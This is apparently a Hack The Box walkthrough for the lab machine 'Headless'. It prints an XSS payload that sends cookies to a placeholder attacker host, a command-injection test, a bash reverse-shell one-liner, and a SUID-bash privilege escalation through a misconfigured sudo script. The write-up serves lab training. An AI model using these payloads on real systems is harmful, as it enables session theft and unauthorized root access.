🔍 HTB: Headless — Walkthrough

Initial Foothold: XSS ➜ Cookie Theft ➜ Command Injection ➜ Root via SUID Priv Esc

Welcome to my write-up for the Hack The Box machine Headless. While multiple approaches exist for this box, I’ll break down the exact steps I used to gain root—starting from XSS and ending with privilege escalation via a misconfigured script with sudo rights.
🔎 Enumeration

I kicked things off with a standard nmap scan:

nmap -sC -sV -v <target-ip>

Port 5000 stood out—it hosted a web service. Exploring it revealed a minimal web interface with very few entry points.

To dive deeper, I ran:

feroxbuster -u http://<target-ip>:5000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

This helped identify two directories:

    /support/

    /dashboard/ (which returned unauthorized access)

The /support/ page had a contact form. I intercepted a submission in BurpSuite and attempted XSS on the message field, but it triggered a “Hacking Attempt Detected” response.
🍪 XSS ➜ Cookie Theft

Noticing a cookie named is_admin—which appeared even without authentication—caught my attention.

I crafted a simple XSS payload:

<img src=x onerror=fetch('http://<attacker-ip>/?c='+document.cookie);>

While injecting it into the message field didn’t work due to filters, I realized the User-Agent header wasn’t sanitized properly. Injecting the same payload into User-Agent triggered the callback and leaked the cookie to my listener.

This allowed me to hijack the session by setting the stolen is_admin cookie and accessing the /dashboard/.
⚙️ Command Injection

With admin access, I intercepted further requests using Burp and discovered a parameter vulnerable to command injection.

Appending a semicolon (;) followed by a payload—like so:

; id

...confirmed that OS-level commands could be executed.

Using a classic bash reverse shell one-liner:

bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'

...I gained a shell as user dvir.
🔐 Privilege Escalation — Sudo Misconfiguration

Running sudo -l revealed that I could execute /usr/bin/syscheck as root without a password.

On inspecting the script, I noticed it would check for and execute a script named initdb.sh from the current directory.

I weaponized this by creating initdb.sh with the following contents:

echo "cp /bin/bash ./bash && chmod +s ./bash" > initdb.sh
chmod +x initdb.sh

Then ran:

sudo /usr/bin/syscheck

This dropped a bash binary with the SUID bit set. I simply executed:

./bash -p

...and gained a root shell.
🎯 Summary

    Initial Access: Reflected XSS ➜ Cookie theft via User-Agent header

    Shell: Command Injection ➜ Reverse shell as dvir

    Privilege Escalation: Misconfigured sudo permissions ➜ Execute arbitrary script via /usr/bin/syscheck

And that’s how I rooted Headless 😎
